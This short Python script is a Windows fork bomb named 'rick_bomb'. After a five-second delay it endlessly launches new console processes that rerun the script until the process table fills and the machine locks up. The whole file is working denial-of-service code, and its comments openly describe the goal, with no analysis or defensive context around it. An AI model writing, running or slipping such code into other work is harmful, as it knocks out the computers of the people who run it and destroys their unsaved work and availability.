import sys
from time import sleep
import subprocess

#Delay execution of roulette by x seconds
DELAY = 5

# rick_bomb
# it's in the name.(Creates command prompts as 
# subprocesses that take up spots in the process 
# list/queue until full)
def rick_bomb():
        while True:
            subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)

if __name__=="__main__":
    sleep(DELAY)
    while True:
        rick_bomb()
        


